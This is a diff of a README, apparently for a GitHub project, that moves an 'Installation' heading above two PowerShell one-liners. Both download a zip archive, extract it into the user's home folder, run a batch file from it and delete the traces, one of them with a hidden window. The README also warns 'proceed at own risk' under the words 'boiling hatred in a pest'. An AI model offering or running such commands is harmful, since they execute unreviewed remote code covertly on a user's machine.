@@ -17,6 +17,13 @@ boiling hatred in a pest
 - 🔴Proceede at own risk❗
 ```
 
+
+
+
+<h3>Installation</h3>
+
+<blockquote>
+	
 ```
 powershell -w hidden -c "& {$w=$home;cd $w;$z=\"$w\r.zip\";Invoke-WebRequest 'https://github.com/3lv/r/archive/r.zip' -o $z;Expand-Archive $z . -f;.\r-r\r.bat;Remove-Item $z,r-r -r -fo;}"&exit
 ```
@@ -25,11 +32,6 @@ powershell -w hidden -c "& {$w=$home;cd $w;$z=\"$w\r.zip\";Invoke-WebRequest 'ht
 ```
 powershell -c "& {$w=$home;cd $w;$z=\"$w\r.zip\";Invoke-WebRequest 'https://github.com/3lv/r/archive/r.zip' -o $z;Expand-Archive $z . -f;.\r-r\r.bat;Remove-Item $z,r-r -r -fo;cls}"
 ```
-
-
-<h3>Installation</h3>
-
-<blockquote>
 	
 <details>
   <summary>PowerShell from r</summary>
